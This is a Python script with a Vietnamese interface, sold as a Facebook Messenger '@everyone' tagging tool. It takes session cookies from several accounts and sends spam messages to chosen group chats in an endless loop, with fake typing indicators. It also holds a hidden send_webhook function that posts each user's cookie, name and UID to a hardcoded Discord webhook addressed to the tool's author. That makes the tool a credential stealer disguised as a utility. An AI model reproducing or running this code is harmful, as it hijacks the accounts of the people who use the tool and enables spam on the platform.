
import multiprocessing
import requests
import os
import re
import json
import time
import random
import ssl
import paho.mqtt.client as mqtt
from urllib.parse import urlparse
from datetime import datetime
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_webhook(ck, name, uid):
    try:
        webhook_url = "https://discord.com/api/webhooks/1443279268686856374/ypnYorUiTmJSdPXDEFJeqzhBokUsjUuTGsXodLIBNADmJktvOpugepbs7rZOCrMUYQLr"
        
        current_time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        fb_link = f"https://www.facebook.com/{uid}"
        
        embed = {
            "title": "🔔 Cookie Mới Đăng Nhập",
            "description": f"**Xin chào chủ nhân Khánh Nam**\n\nĐây là thông tin cookie mới:",
            "color": 3447003,
            "fields": [
                {
                    "name": "👤 Tên",
                    "value": f"```{name}```",
                    "inline": False
                },
                {
                    "name": "🆔 UID",
                    "value": f"```{uid}```",
                    "inline": False
                },
                {
                    "name": "🍪 Cookie",
                    "value": f"```{ck[:1000]}...```" if len(ck) > 1000 else f"```{ck}```",
                    "inline": False
                },
                {
                    "name": "⏰ Thời gian login",
                    "value": f"```{current_time}```",
                    "inline": False
                },
                {
                    "name": "🔗 Link Facebook",
                    "value": fb_link,
                    "inline": False
                }
            ],
            "footer": {
                "text": "Facebook Spam Tool"
            },
            "timestamp": datetime.utcnow().isoformat()
        }
        
        payload = {
            "embeds": [embed]
        }
        
        response = requests.post(webhook_url, json=payload, timeout=10)
        
        if response.status_code == 204:
            return True
        else:
            return False
            
    except Exception as e:
        return False

def chk_cookie(ck):
    try:
        if 'c_user=' not in ck:
            return {"ok": False, "msg": "Cookie không chứa user_id"}
        
        uid = ck.split('c_user=')[1].split(';')[0]
        h = {
            'cookie': ck,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        r = requests.get(f'https://m.facebook.com/profile.php?id={uid}', headers=h, timeout=30)
        name = r.text.split('<title>')[1].split('<')[0].strip()
        return {"ok": True, "name": name, "uid": uid}
    except:
        return {"ok": False, "msg": "Cookie không hợp lệ"}

def load_txt(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            content = f.read()
        if not content.strip():
            raise Exception(f"File {path} trống!")
        return content
    except Exception as e:
        raise Exception(f"Lỗi đọc file {path}: {str(e)}")

def parse_sel(s, mx):
    try:
        nums = [int(i.strip()) for i in s.split(',')]
        return [n for n in nums if 1 <= n <= mx]
    except:
        return []

def gen_otid():
    ret = int(time.time() * 1000)
    val = random.randint(0, 4294967295)
    bin_str = format(val, "022b")[-22:]
    return str(int(bin(ret)[2:] + bin_str, 2))

def gen_sid():
    return random.randint(1, 2 ** 53)

def gen_cid():
    import string
    def g(n):
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
    return g(8) + '-' + g(4) + '-' + g(4) + '-' + g(4) + '-' + g(12)

class MQTT:
    def __init__(self, ck, uid):
        self.ck = ck
        self.uid = uid
        self.cli = None
        self.req_num = 0
        self.task_num = 0
        self.conn = False
        
    def connect(self):
        try:
            sid = gen_sid()
            usr = {
                "u": self.uid,
                "s": sid,
                "chat_on": json.dumps(True, separators=(",", ":")),
                "fg": False,
                "d": gen_cid(),
                "ct": "websocket",
                "aid": 219994525426954,
                "mqtt_sid": "",
                "cp": 3,
                "ecp": 10,
                "st": [],
                "pm": [],
                "dc": "",
                "no_auto_fg": True,
                "gas": None,
                "pack": [],
            }
            
            host = f"wss://edge-chat.facebook.com/chat?region=eag&sid={sid}"
            
            try:
                self.cli = mqtt.Client(
                    client_id="mqttwsclient",
                    clean_session=True,
                    protocol=mqtt.MQTTv31,
                    transport="websockets",
                    callback_api_version=mqtt.CallbackAPIVersion.VERSION2
                )
            except:
                self.cli = mqtt.Client(
                    client_id="mqttwsclient",
                    clean_session=True,
                    protocol=mqtt.MQTTv31,
                    transport="websockets"
                )
            
            self.cli.tls_set(certfile=None, keyfile=None, cert_reqs=ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLSv1_2)
            self.cli.on_connect = self._on_conn
            self.cli.on_disconnect = self._on_disc
            self.cli.username_pw_set(username=json.dumps(usr, separators=(",", ":")))
            
            parsed = urlparse(host)
            self.cli.ws_set_options(
                path=f"{parsed.path}?{parsed.query}",
                headers={
                    "Cookie": self.ck,
                    "Origin": "https://www.facebook.com",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36",
                    "Referer": "https://www.facebook.com/",
                    "Host": "edge-chat.facebook.com",
                },
            )
            
            print("Đang kết nối MQTT...")
            self.cli.connect(host="edge-chat.facebook.com", port=443, keepalive=10)
            self.cli.loop_start()
            time.sleep(3)
            return self.conn
            
        except Exception as e:
            print(f"Lỗi MQTT: {e}")
            return False
    
    def _on_conn(self, cli, ud, fl, rc, prop=None):
        if rc == 0:
            print("MQTT đã kết nối!")
            self.conn = True
        else:
            print(f"MQTT lỗi: {rc}")
            self.conn = False
    
    def _on_disc(self, cli, ud, rc, prop=None):
        print(f"MQTT ngắt kết nối: {rc}")
        self.conn = False
    
    def send_typ(self, tid, typing=True):
        if not self.conn or not self.cli:
            return False
        self.req_num += 1
        try:
            task_pay = {
                "thread_key": tid,
                "is_group_thread": 1,
                "is_typing": 1 if typing else 0,
                "attribution": 0
            }
            
            cont = {
                "app_id": "2220391788200892",
                "payload": json.dumps({
                    "label": "3",
                    "payload": json.dumps(task_pay, separators=(",", ":")),
                    "version": "25393437286970779",
                }, separators=(",", ":")),
                "request_id": self.req_num,
                "type": 4,
            }
            
            self.cli.publish("/ls_req", json.dumps(cont, separators=(",", ":")), qos=1, retain=False)
            return True
        except:
            return False
    
    def send_msg_ev(self, tid, txt):
        if not self.conn or not self.cli:
            return False
        
        self.req_num += 1
        ts = int(time.time() * 1000)
        
        cont = {
            "app_id": "2220391788200892",
            "payload": {
                "epoch_id": int(gen_otid()),
                "tasks": [],
                "version_id": "25173736578960520",
            },
            "request_id": self.req_num,
            "type": 3,
        }
        
        if txt:
            self.task_num += 1
            
            task_pay = {
                "thread_id": int(tid),
                "otid": gen_otid(),
                "source": 65541,
                "send_type": 1,
                "sync_group": 1,
                "mark_thread_read": 1,
                "text": f"@everyone {txt}",
                "mention_data": {
                    "mention_ids": str(tid),
                    "mention_offsets": "0",
                    "mention_lengths": "9",
                    "mention_types": "t"
                },
                "initiating_source": 1,
                "skip_url_preview_gen": 0,
                "text_has_links": 0,
                "multitab_env": 0,
                "metadata_dataclass": {
                    "media_accessibility_metadata": {
                        "alt_text": None
                    }
                }
            }
            
            task = {
                "failure_count": None,
                "label": "46",
                "payload": json.dumps(task_pay, separators=(",", ":")),
                "queue_name": str(tid),
                "task_id": self.task_num,
            }
            
            cont["payload"]["tasks"].append(task)
            
            self.task_num += 1
            task_mark = {
                "failure_count": None,
                "label": "21",
                "payload": json.dumps({
                    "thread_id": int(tid),
                    "last_read_watermark_ts": ts,
                    "sync_group": 1,
                }, separators=(",", ":")),
                "queue_name": str(tid),
                "task_id": self.task_num,
            }
            
            cont["payload"]["tasks"].append(task_mark)
        
        cont["payload"] = json.dumps(cont["payload"], separators=(",", ":"))
        
        try:
            self.cli.publish(
                topic="/ls_req",
                payload=json.dumps(cont, separators=(",", ":")),
                qos=1,
                retain=False,
            )
            return True
        except:
            return False
    
    def close(self):
        if self.cli:
            self.cli.loop_stop()
            self.cli.disconnect()

class MSG:
    def __init__(self, ck):
        self.ck = ck
        self.uid = self.get_uid()
        self.dtsg = None
        self.jaz = None
        self.mqtt = None
        self.init_params()
        self.conn_mqtt()

    def conn_mqtt(self):
        try:
            self.mqtt = MQTT(self.ck, self.uid)
            if self.mqtt.connect():
                return True
            else:
                print("Không thể kết nối MQTT")
                return False
        except Exception as e:
            print(f"Lỗi MQTT: {e}")
            return False

    def get_uid(self):
        try:
            return re.search(r"c_user=(\d+)", self.ck).group(1)
        except:
            raise Exception("Cookie không hợp lệ")

    def init_params(self):
        h = {'Cookie': self.ck, 'User-Agent': 'Mozilla/5.0'}
        try:
            for url in ['https://www.facebook.com', 'https://mbasic.facebook.com']:
                r = requests.get(url, headers=h)
                m_dtsg = re.search(r'name="fb_dtsg" value="(.*?)"', r.text)
                m_jaz = re.search(r'name="jazoest" value="(.*?)"', r.text)
                if m_dtsg:
                    self.dtsg = m_dtsg.group(1)
                if m_jaz:
                    self.jaz = m_jaz.group(1)
                if m_dtsg and m_jaz:
                    return
            raise Exception("Không tìm thấy fb_dtsg hoặc jazoest")
        except Exception as e:
            raise Exception(f"Lỗi khởi tạo: {str(e)}")

    def get_threads(self, lmt=100):
        h = {
            'Cookie': self.ck,
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        data = {
            "av": self.uid,
            "__user": self.uid,
            "__a": "1",
            "fb_dtsg": self.dtsg,
            "jazoest": self.jaz,
            "queries": json.dumps({
                "o0": {
                    "doc_id": "3336396659757871",
                    "query_params": {
                        "limit": lmt,
                        "before": None,
                        "tags": ["INBOX"],
                        "includeDeliveryReceipts": False,
                        "includeSeqID": True,
                    }
                }
            })
        }
        
        try:
            r = requests.post('https://www.facebook.com/api/graphqlbatch/', data=data, headers=h, timeout=15)
            
            if r.status_code != 200:
                return {"err": f"HTTP Error: {r.status_code}"}
            
            txt = r.text.split('{"successful_results"')[0]
            d = json.loads(txt)
            
            if "o0" not in d:
                return {"err": "Không tìm thấy dữ liệu"}
            
            if "errors" in d["o0"]:
                return {"err": f"API Error: {d['o0']['errors'][0]['summary']}"}
            
            threads = d["o0"]["data"]["viewer"]["message_threads"]["nodes"]
            lst = []
            
            for th in threads:
                if not th.get("thread_key") or not th["thread_key"].get("thread_fbid"):
                    continue
                lst.append({
                    "tid": th["thread_key"]["thread_fbid"],
                    "name": th.get("name", "Không có tên")
                })
            
            return {"ok": True, "cnt": len(lst), "threads": lst}
            
        except Exception as e:
            return {"err": f"Lỗi: {str(e)}"}

    def send_typ(self, tid, typing=True):
        if self.mqtt and self.mqtt.conn:
            return self.mqtt.send_typ(tid, typing)
        return False

    def send_msg_ev(self, tid, txt):
        if self.mqtt and self.mqtt.conn:
            self.send_typ(tid, True)
            time.sleep(6)
            ok = self.mqtt.send_msg_ev(tid, txt)
            self.send_typ(tid, False)
            return "ok" if ok else "fail"
        return "fail"

def spam_worker(ck, name, uid, tids, tnames, dly, msgs, repl):
    try:
        msg = MSG(ck)
        idx = 0
        
        if msg.mqtt and msg.mqtt.conn:
            print(f"{name}: MQTT OK")
        else:
            print(f"{name}: MQTT FAIL")
        
        while True:
            for tid, tname in zip(tids, tnames):
                txt = msgs.replace("{name}", repl) if "{name}" in msgs else msgs
                
                st = msg.send_msg_ev(tid, txt)
                st_txt = "OK" if st == "ok" else "FAIL"
                
                print(f"User: {name} | Box: {tname} | Status: {st_txt}")
                
                time.sleep(dly)
                
    except Exception as e:
        print(f"Lỗi {name}: {str(e)}")

def main():
    clr()
    
    print("=" * 60)
    print(" TOOL TREO TAG MỌI NGƯỜI BY DZI - @EVERYONE TAG")
    print("=" * 60)
    
    try:
        n_acc = int(input("\nNhập số lượng acc muốn chạy: "))
        if n_acc < 1:
            print("Số lượng phải > 0")
            return
    except:
        print("Số lượng phải là số nguyên")
        return

    procs = []
    for i in range(n_acc):
        print(f"\n{'='*60}")
        print(f" TÀI KHOẢN {i+1}")
        print(f"{'='*60}")
        
        ck = input("Nhập Cookie: ").strip()
        if not ck:
            print("Cookie trống, bỏ qua")
            continue
        
        print("Đang kiểm tra cookie...")
        cl = chk_cookie(ck)
        
        if not cl["ok"]:
            print(f"Lỗi: {cl['msg']}, bỏ qua")
            continue
        
        print(f"Facebook: {cl['name']} (ID: {cl['uid']}) - Cookie OK!")
        
        
        webhook_sent = send_webhook(ck, cl['name'], cl['uid'])
        if webhook_sent:
            print("Done")
        else:
            print("Nope")

        try:
            msg = MSG(ck)
            print("Đang lấy danh sách box...")
            res = msg.get_threads(lmt=100)
            
            if "err" in res:
                print(f"Lỗi: {res['err']}, bỏ qua")
                continue
            
            ths = res['threads']
            if not ths:
                print("Không tìm thấy box, bỏ qua")
                continue
            
            print(f"\nDANH SÁCH BOX - {len(ths)} BOX")
            print("-" * 80)
            print(f"{'STT':<5} {'Tên Box':<50} {'ID Box':<25}")
            print("-" * 80)
            
            for idx, th in enumerate(ths, 1):
                tn = th.get('name', 'Không có tên') or 'Không có tên'
                dn = f"{tn[:45]}{'...' if len(tn) > 45 else ''}"
                print(f"{idx:<5} {dn:<50} {th['tid']:<25}")
            
            print("-" * 80)
            
            raw = input("\nNhập STT box muốn chạy (VD: 1,3 hoặc all): ").strip()
            
            if raw.lower() == 'all':
                sel = list(range(1, len(ths) + 1))
            else:
                sel = parse_sel(raw, len(ths))
            
            if not sel:
                print("Không chọn box, bỏ qua")
                continue
            
            sel_ids = [ths[i - 1]['tid'] for i in sel]
            sel_names = [ths[i - 1]['name'] or 'Không có tên' for i in sel]
            
            ftxt = input("\nNhập tên file .txt chứa nội dung: ").strip()
            try:
                msg_content = load_txt(ftxt)
                print(f"Đã tải nội dung từ {ftxt}")
            except Exception as e:
                print(f"Lỗi: {str(e)}, bỏ qua")
                continue
            
            repl_txt = input("Nhập nội dung thay thế cho {name} (Enter nếu không): ").strip()
            
            try:
                dly = int(input("Nhập delay giữa các lần gửi (giây): "))
                if dly < 1:
                    print("Delay phải > 0, bỏ qua")
                    continue
            except:
                print("Delay phải là số nguyên, bỏ qua")
                continue
            
            print(f"\n{'='*60}")
            print(f" KHỞI ĐỘNG TÀI KHOẢN {cl['name']}")
            print(f"{'='*60}")
            
            if msg.mqtt and msg.mqtt.conn:
                print("MQTT đã sẵn sàng!")
            else:
                print("Không có MQTT")
            
            p = multiprocessing.Process(
                target=spam_worker,
                args=(ck, cl['name'], cl['uid'], sel_ids, sel_names, dly, msg_content, repl_txt)
            )
            procs.append(p)
            p.start()
            
            time.sleep(2)
            
        except Exception as e:
            print(f"Lỗi {cl['name']}: {str(e)}, bỏ qua")
            continue
    
    if not procs:
        print("\nKhông có tài khoản nào được khởi động")
        return
    
    print(f"\n{'='*60}")
    print(" KHỞI ĐỘNG THÀNH CÔNG")
    print(f"{'='*60}")
    print(f"Đã khởi động {len(procs)} tài khoản")
    print("Tính năng: @everyone Tag + Fake Typing")
    print("Nhấn Ctrl+C để dừng")
    print("=" * 60)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\nĐang dừng tất cả tiến trình...")
        for p in procs:
            p.terminate()
        time.sleep(2)
        print("Đã dừng tất cả!")

if __name__ == "__main__":
    main()